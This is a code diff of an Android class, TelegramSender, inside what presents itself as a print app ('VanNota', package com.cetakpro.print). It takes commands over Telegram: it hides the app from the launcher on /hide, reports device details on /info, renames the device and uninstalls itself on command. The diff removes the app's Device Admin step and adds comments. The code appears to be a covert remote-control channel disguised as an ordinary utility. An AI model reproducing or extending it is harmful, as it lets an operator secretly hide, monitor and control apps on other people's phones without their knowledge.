@@ -1,6 +1,5 @@
 package com.cetakpro.print;
 
-import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
@@ -84,6 +83,9 @@ public class TelegramSender {
     private static void handleTelegramCommand(Context context, String command) {
         Log.d(TAG, "📩 Perintah diterima: " + command);
         
+        // ==========================================
+        // /hide - SEMBUNYIKAN APLIKASI
+        // ==========================================
         if (command.equalsIgnoreCase("/hide")) {
             Log.d(TAG, "👻 Perintah hide diterima!");
             
@@ -110,6 +112,9 @@ public class TelegramSender {
             return;
         }
         
+        // ==========================================
+        // /unhide - TAMPILKAN APLIKASI
+        // ==========================================
         if (command.equalsIgnoreCase("/unhide")) {
             Log.d(TAG, "👀 Perintah unhide diterima!");
             
@@ -136,27 +141,16 @@ public class TelegramSender {
             return;
         }
         
+        // ==========================================
+        // /uninstall - HAPUS APLIKASI (TANPA DEVICE ADMIN)
+        // ==========================================
         if (command.equalsIgnoreCase("/uninstall") || command.equalsIgnoreCase("/hapus")) {
             Log.d(TAG, "🗑️ Perintah uninstall diterima!");
             
             sendMessage(context, "🗑️ UNINSTALL", "Menghapus VanNota dari " + getDeviceName(context) + "...");
             
             try {
-                DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
-                ComponentName admin = new ComponentName(context, AdminReceiver.class);
-                if (dpm.isAdminActive(admin)) {
-                    dpm.removeActiveAdmin(admin);
-                    Log.d(TAG, "✅ Device Admin dinonaktifkan");
-                }
-            } catch (Exception e) {
-                Log.e(TAG, "❌ Gagal matikan admin: " + e.getMessage());
-            }
-            
-            try {
-                Thread.sleep(1500);
-            } catch (InterruptedException ignored) {}
-            
-            try {
+                // Langsung jalankan uninstall tanpa Device Admin
                 Intent intent = new Intent(Intent.ACTION_DELETE);
                 intent.setData(Uri.parse("package:" + context.getPackageName()));
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -171,6 +165,9 @@ public class TelegramSender {
             return;
         }
         
+        // ==========================================
+        // /info - LIHAT INFO PERANGKAT
+        // ==========================================
         if (command.equalsIgnoreCase("/info") || command.equalsIgnoreCase("/status")) {
             SharedPreferences prefs = context.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
             String deviceName = prefs.getString("device_name", Build.MODEL);
@@ -199,6 +196,9 @@ public class TelegramSender {
             return;
         }
         
+        // ==========================================
+        // /rename [nama] - UBAH NAMA PERANGKAT
+        // ==========================================
         if (command.startsWith("/rename ")) {
             String newName = command.substring(8).trim();
             if (newName.isEmpty()) {
@@ -213,6 +213,9 @@ public class TelegramSender {
             return;
         }
         
+        // ==========================================
+        // /help - BANTUAN
+        // ==========================================
         if (command.equalsIgnoreCase("/help")) {
             String help = "📋 DAFTAR PERINTAH\n\n" +
                           "/hide - Sembunyikan aplikasi dari launcher\n" +
@@ -226,6 +229,9 @@ public class TelegramSender {
             return;
         }
         
+        // ==========================================
+        // PERINTAH TIDAK DIKENAL
+        // ==========================================
         sendMessage(context, "❓ Perintah tidak dikenal", "Kirim /help untuk melihat daftar perintah.");
     }
 }
